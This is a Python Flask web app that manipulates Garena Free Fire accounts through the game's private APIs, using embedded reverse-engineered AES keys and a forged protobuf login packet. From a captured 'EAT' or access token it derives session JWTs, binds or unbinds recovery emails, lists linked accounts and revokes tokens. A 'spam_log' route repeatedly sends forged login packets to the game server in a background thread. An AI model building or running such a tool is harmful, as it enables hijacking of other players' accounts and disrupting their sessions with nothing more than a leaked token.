#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import hashlib
import requests
import time
import re
import json
import base64
import socket
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import urllib3
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

# ==================== CONSTANTS ====================
SECRET_KEY = b"1e5898ccb8dfdd921f9bdea848768b64a201"
AES_KEY = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
AES_IV = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])
FF_VER = "OB53"

GARENA_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

# ==================== UTILITY FUNCTIONS ====================
def decode_nickname(encoded: str) -> str:
    try:
        raw = base64.b64decode(encoded)
        dec = bytearray()
        for i, b in enumerate(raw):
            dec.append(b ^ SECRET_KEY[i % len(SECRET_KEY)])
        return dec.decode("utf-8", errors="replace")
    except Exception:
        return encoded

def aes_encrypt(data: bytes, key=AES_KEY, iv=AES_IV) -> bytes:
    if isinstance(key, str):
        key = bytes.fromhex(key) if len(key) == 32 else key.encode()
    if isinstance(iv, str):
        iv = bytes.fromhex(iv) if len(iv) == 32 else iv.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data, AES.block_size))

def aes_decrypt(data: bytes, key=AES_KEY, iv=AES_IV) -> bytes:
    if isinstance(key, str):
        key = bytes.fromhex(key) if len(key) == 32 else key.encode()
    if isinstance(iv, str):
        iv = bytes.fromhex(iv) if len(iv) == 32 else iv.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data), AES.block_size)

def parse_proto(data: bytes) -> dict:
    result = {}
    idx = 0
    while idx < len(data):
        try:
            tag = data[idx]
            idx += 1
            fn = tag >> 3
            wt = tag & 0x07
            if wt == 0:
                val = 0
                shift = 0
                while idx < len(data):
                    b = data[idx]
                    idx += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80):
                        break
                    shift += 7
                if fn in result:
                    if not isinstance(result[fn], list):
                        result[fn] = [result[fn]]
                    result[fn].append(val)
                else:
                    result[fn] = val
            elif wt == 2:
                ln = 0
                shift = 0
                while idx < len(data):
                    b = data[idx]
                    idx += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80):
                        break
                    shift += 7
                vb = data[idx:idx+ln]
                idx += ln
                if fn in result:
                    if not isinstance(result[fn], list):
                        result[fn] = [result[fn]]
                    result[fn].append(vb)
                else:
                    result[fn] = vb
            elif wt == 1:
                idx += 8
            elif wt == 5:
                idx += 4
            else:
                break
        except:
            break
    return result

def decode_jwt(token: str) -> dict:
    parts = token.split(".")
    if len(parts) < 2:
        return {}
    p = parts[1] + "=" * (-len(parts[1]) % 4)
    try:
        payload = json.loads(base64.urlsafe_b64decode(p).decode())
        if "nickname" in payload and isinstance(payload["nickname"], str):
            payload["nickname"] = decode_nickname(payload["nickname"])
        return payload
    except:
        return {}

def convert_time(seconds):
    d, s = divmod(int(seconds), 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    return f"{d}d {h}h {m}m {s}s"

def parse_duration(s):
    total = 0
    parts = s.split(':')
    for part in parts:
        part = part.strip().lower()
        if not part:
            continue
        if part.endswith('d'):
            total += int(part[:-1]) * 86400
        elif part.endswith('h'):
            total += int(part[:-1]) * 3600
        elif part.endswith('m'):
            total += int(part[:-1]) * 60
        elif part.endswith('s'):
            total += int(part[:-1])
        elif part.isdigit():
            total += int(part)
    return total

def extract_eat_from_input(raw: str) -> str:
    raw = raw.strip()
    if raw.startswith('http'):
        m = re.search(r'[?&]eat=([a-fA-F0-9]+)', raw)
        if m:
            return m.group(1)
    return raw

def _varint(v):
    r = bytearray()
    while v > 0x7F:
        r.append((v & 0x7F) | 0x80)
        v >>= 7
    r.append(v)
    return bytes(r)

def _str_field(f, v):
    if isinstance(v, str):
        v = v.encode()
    return _varint((f << 3) | 2) + _varint(len(v)) + v

def build_login_payload(open_id: str, access_token: str, platform: int) -> bytes:
    now = str(datetime.now())[:19]
    pl = bytearray()
    pl += _str_field(3, now)
    pl += _str_field(22, open_id)
    pl += _str_field(23, str(platform))
    pl += _str_field(29, access_token)
    pl += _str_field(99, str(platform))
    return bytes(pl)

def build_login_packet_from_jwt(jwt_token: str, key, iv) -> bytes:
    payload = decode_jwt(jwt_token)
    acc_id = int(payload.get('account_id', 0))
    exp = int(payload.get('exp', 0))
    exp_adj = max(exp - 28800, 0)
    
    enc_token = aes_encrypt(jwt_token.encode(), key, iv)
    body_len = len(enc_token)
    
    acc_hex = acc_id.to_bytes(8, "big").hex()
    time_hex = exp_adj.to_bytes(4, "big").hex()
    body_len_hex = body_len.to_bytes(4, "big").hex()
    header_hex = "0115" + acc_hex + time_hex + body_len_hex
    return bytes.fromhex(header_hex) + enc_token

# ==================== API FUNCTIONS ====================
def send_otp(email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    data = {"email": email, "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": access_token}
    try:
        return requests.post(url, headers=GARENA_HEADERS, data=data)
    except Exception as e:
        return None

def verify_otp(otp, email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    data = {"app_id": "100067", "access_token": access_token, "otp": otp, "email": email}
    return requests.post(url, data=data, headers=GARENA_HEADERS)

def cancel_request(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access_token}
    try:
        requests.post(url, data=payload, headers=GARENA_HEADERS)
    except:
        pass

def inspect_token(access_token: str):
    url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
    h = {"Connection": "close", "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"}
    r = requests.get(url, headers=h, timeout=10)
    d = r.json()
    if 'error' in d:
        raise Exception(f"Token lỗi: {d.get('error')}")
    return d.get('open_id'), int(d.get('platform', 8))

def eat_to_access(eat_token: str) -> str:
    TARGET = "https://api-otrss.garena.com/support/callback/"
    session = requests.Session()
    resp = session.get(TARGET, params={'access_token': eat_token}, allow_redirects=False)
    while resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get('Location', '')
        if not location:
            break
        if not location.startswith(('http://', 'https://')):
            base = urlparse(TARGET)
            location = base._replace(path=location).geturl()
        resp = session.get(location, allow_redirects=False)
    parsed = urlparse(resp.url)
    params = parse_qs(parsed.query)
    return params.get('access_token', [None])[0]

def do_major_login(open_id: str, access_token: str, platform: int):
    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': FF_VER,
        'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
        'Host': 'loginbp.ggpolarbear.com', 'Connection': 'Keep-Alive'
    }
    enc = aes_encrypt(build_login_payload(open_id, access_token, platform))
    resp = requests.post(url, headers=headers, data=enc, verify=False, timeout=10)
    if resp.status_code != 200:
        raise Exception(f"MajorLogin thất bại HTTP {resp.status_code}")
    
    content = resp.content
    parsed = parse_proto(content)
    token = parsed.get(8)
    if isinstance(token, list):
        token = token[0]
    if token:
        if isinstance(token, bytes):
            token = token.decode('utf-8', 'ignore')
        key = parsed.get(22, AES_KEY)
        if isinstance(key, list):
            key = key[0]
        iv = parsed.get(23, AES_IV)
        if isinstance(iv, list):
            iv = iv[0]
        return token, key, iv
    raise Exception("Không parse được JWT từ MajorLogin")

def create_bind_request(verifier_token, access_token, email, sec_pw):
    hashed_password = hashlib.sha256(sec_pw.encode('utf-8')).hexdigest().upper()
    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    data = {
        "app_id": "100067",
        "access_token": access_token,
        "verifier_token": verifier_token,
        "secondary_password": hashed_password,
        "email": email
    }
    return requests.post(url, data=data, headers=GARENA_HEADERS)

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/add_recovery', methods=['POST'])
def api_add_recovery():
    try:
        data = request.json
        email = data.get('email')
        access_token = data.get('access_token')
        sec_pw = data.get('security_code')
        
        if not email or not access_token or not sec_pw:
            return jsonify({'success': False, 'error': 'Thiếu thông tin'})
        
        if not sec_pw.isdigit() or len(sec_pw) != 6:
            return jsonify({'success': False, 'error': 'Security Code phải gồm 6 chữ số'})
        
        # Send OTP
        resp = send_otp(email, access_token)
        if not resp or resp.status_code != 200:
            return jsonify({'success': False, 'error': 'Gửi OTP thất bại'})
        
        # Verify OTP (cần nhập OTP thủ công)
        return jsonify({'success': False, 'error': 'Vui lòng xác thực OTP trước', 'need_otp': True, 'email': email, 'access_token': access_token})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify_otp', methods=['POST'])
def api_verify_otp():
    try:
        data = request.json
        otp = data.get('otp')
        email = data.get('email')
        access_token = data.get('access_token')
        sec_pw = data.get('security_code')
        
        vr = verify_otp(otp, email, access_token)
        if vr.status_code != 200:
            return jsonify({'success': False, 'error': 'OTP không hợp lệ'})
        
        verifier_token = vr.json().get("verifier_token")
        if not verifier_token:
            return jsonify({'success': False, 'error': 'Không lấy được verifier token'})
        
        br = create_bind_request(verifier_token, access_token, email, sec_pw)
        if br.status_code == 200:
            return jsonify({'success': True, 'message': f'Đã thêm email {email} thành công!'})
        else:
            return jsonify({'success': False, 'error': br.text})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check_recovery', methods=['POST'])
def api_check_recovery():
    try:
        access_token = request.json.get('access_token')
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        resp = requests.get(url, params={'app_id': "100067", 'access_token': access_token}, headers=GARENA_HEADERS)
        
        if resp.status_code == 200:
            data = resp.json()
            email = data.get("email", "")
            email_to_be = data.get("email_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            
            return jsonify({
                'success': True,
                'email': email,
                'pending_email': email_to_be,
                'countdown': countdown,
                'has_email': email != "",
                'has_pending': email_to_be != ""
            })
        else:
            return jsonify({'success': False, 'error': f'API Error: {resp.status_code}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check_platforms', methods=['POST'])
def api_check_platforms():
    try:
        access_token = request.json.get('access_token')
        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        resp = requests.get(url, params={'access_token': access_token}, headers=GARENA_HEADERS)
        
        if resp.status_code not in [200, 201]:
            return jsonify({'success': False, 'error': 'Không thể lấy dữ liệu'})
        
        platform_names = {3:"Facebook", 8:"Gmail", 10:"Apple", 5:"VK", 11:"Twitter (X)", 7:"Huawei"}
        data = resp.json()
        bounded = data.get("bounded_accounts", [])
        available = data.get("available_platforms", [])
        
        main_platform = None
        for pid, name in platform_names.items():
            if pid not in available:
                main_platform = name
                break
        
        linked = []
        for acc in bounded:
            platform = acc.get('platform')
            ui = acc.get('user_info', {})
            if platform in platform_names:
                linked.append({
                    'name': platform_names[platform],
                    'email': ui.get('email', ''),
                    'nickname': ui.get('nickname', '')
                })
        
        return jsonify({
            'success': True,
            'main_platform': main_platform,
            'linked': linked
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/cancel_recovery', methods=['POST'])
def api_cancel_recovery():
    try:
        access_token = request.json.get('access_token')
        url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        resp = requests.post(url, data={'app_id': "100067", 'access_token': access_token}, headers=GARENA_HEADERS)
        
        if resp.status_code == 200:
            return jsonify({'success': True, 'message': 'Đã hủy yêu cầu thành công'})
        else:
            return jsonify({'success': False, 'error': 'Không tìm thấy yêu cầu đang chờ'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/revoke_token', methods=['POST'])
def api_revoke_token():
    try:
        access_token = request.json.get('access_token')
        resp = requests.get(f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}")
        
        if resp.text.strip() == '{"result":0}':
            return jsonify({'success': True, 'message': 'Token đã được thu hồi'})
        else:
            return jsonify({'success': False, 'error': resp.text})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/eat_to_access', methods=['POST'])
def api_eat_to_access():
    try:
        eat_input = request.json.get('eat_token')
        eat = extract_eat_from_input(eat_input)
        if not eat:
            return jsonify({'success': False, 'error': 'Không thể tách EAT token'})
        
        access = eat_to_access(eat)
        if access:
            return jsonify({'success': True, 'access_token': access})
        else:
            return jsonify({'success': False, 'error': 'Không lấy được Access Token'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/eat_to_jwt', methods=['POST'])
def api_eat_to_jwt():
    try:
        eat_input = request.json.get('eat_token')
        eat = extract_eat_from_input(eat_input)
        if not eat:
            return jsonify({'success': False, 'error': 'Không thể tách EAT token'})
        
        access = eat_to_access(eat)
        if not access:
            return jsonify({'success': False, 'error': 'Không lấy được Access Token'})
        
        open_id, platform = inspect_token(access)
        jwt, _, _ = do_major_login(open_id, access, platform)
        decoded = decode_jwt(jwt)
        
        return jsonify({
            'success': True,
            'jwt': jwt,
            'decoded': decoded
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/access_to_jwt', methods=['POST'])
def api_access_to_jwt():
    try:
        access_token = request.json.get('access_token')
        open_id, platform = inspect_token(access_token)
        jwt, _, _ = do_major_login(open_id, access_token, platform)
        decoded = decode_jwt(jwt)
        
        return jsonify({
            'success': True,
            'jwt': jwt,
            'decoded': decoded
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/unbind_email', methods=['POST'])
def api_unbind_email():
    try:
        data = request.json
        email = data.get('email')
        access_token = data.get('access_token')
        method = data.get('method', 'otp')
        
        if method == 'otp':
            resp = requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp",
                                 headers=GARENA_HEADERS,
                                 data={"email": email, "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": access_token})
            if '\"result\":0' not in resp.text.replace(" ", ""):
                return jsonify({'success': False, 'error': 'Gửi OTP thất bại'})
            return jsonify({'success': False, 'need_otp': True, 'message': 'OTP đã gửi, vui lòng xác thực', 'email': email, 'access_token': access_token})
        else:
            sec_pw = data.get('security_code')
            if not sec_pw or not sec_pw.isdigit() or len(sec_pw) != 6:
                return jsonify({'success': False, 'error': 'Security Code phải gồm 6 chữ số'})
            hashed_sp = hashlib.sha256(sec_pw.encode('utf-8')).hexdigest().upper()
            r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                              headers=GARENA_HEADERS,
                              data={"email": email, "secondary_password": hashed_sp, "app_id": "100067", "access_token": access_token})
            identity_token = r.json().get("identity_token")
            if not identity_token:
                return jsonify({'success': False, 'error': 'Xác thực thất bại'})
            resp = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                                 headers=GARENA_HEADERS,
                                 data={"app_id": "100067", "access_token": access_token, "identity_token": identity_token})
            if '\"result\":0' in resp.text.replace(" ", ""):
                return jsonify({'success': True, 'message': 'Đã tạo yêu cầu hủy liên kết'})
            else:
                return jsonify({'success': False, 'error': resp.text})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
        
@app.route('/api/unbind_verify', methods=['POST'])
def api_unbind_verify():
    try:
        data = request.json
        otp = data.get('otp')
        email = data.get('email')
        access_token = data.get('access_token')
        
        r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                          headers=GARENA_HEADERS,
                          data={"email": email, "otp": otp, "app_id": "100067", "access_token": access_token})
        identity_token = r.json().get("identity_token")
        if not identity_token:
            return jsonify({'success': False, 'error': 'Xác thực OTP thất bại'})
        
        resp = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                             headers=GARENA_HEADERS,
                             data={"app_id": "100067", "access_token": access_token, "identity_token": identity_token})
        
        if '\"result\":0' in resp.text.replace(" ", ""):
            return jsonify({'success': True, 'message': 'Đã tạo yêu cầu hủy liên kết'})
        else:
            return jsonify({'success': False, 'error': resp.text})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
        
@app.route('/api/spam_log', methods=['POST'])
def api_spam_log():
    try:
        data = request.json
        access_token = data.get('access_token')
        duration_str = data.get('duration', '1m')
        
        total_seconds = parse_duration(duration_str)
        if total_seconds <= 0:
            return jsonify({'success': False, 'error': 'Thời gian không hợp lệ'})
        
        # Run spam in background
        def run_spam():
            try:
                open_id, platform = inspect_token(access_token)
                jwt_token, key, iv = do_major_login(open_id, access_token, platform)
                
                enc = aes_encrypt(build_login_payload(open_id, access_token, platform))
                headers = {
                    'Authorization': f'Bearer {jwt_token}', 'X-Unity-Version': '2018.4.11f1',
                    'X-GA': 'v1 1', 'ReleaseVersion': FF_VER,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
                    'Host': 'clientbp.ggpolarbear.com', 'Connection': 'close'
                }
                resp = requests.post("https://clientbp.ggpolarbear.com/GetLoginData",
                                     headers=headers, data=enc, verify=False, timeout=10)
                
                parsed = parse_proto(resp.content)
                online_addr = parsed.get(14)
                if isinstance(online_addr, list):
                    online_addr = online_addr[0]
                if online_addr:
                    if isinstance(online_addr, bytes):
                        online_addr = online_addr.decode('utf-8', 'ignore')
                    parts = online_addr.rsplit(':', 1)
                    if len(parts) == 2:
                        online_ip, online_port = parts[0], int(parts[1])
                    else:
                        return
                else:
                    return
                
                packet = build_login_packet_from_jwt(jwt_token, key, iv)
                start_time = time.time()
                count = 0
                
                while time.time() - start_time < total_seconds:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(8)
                        s.connect((online_ip, online_port))
                        s.sendall(packet)
                        count += 1
                        s.close()
                    except:
                        count += 1
                    time.sleep(1.0)
            except:
                pass
        
        thread = threading.Thread(target=run_spam)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': f'Đã bắt đầu spam trong {convert_time(total_seconds)}',
            'duration': total_seconds
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)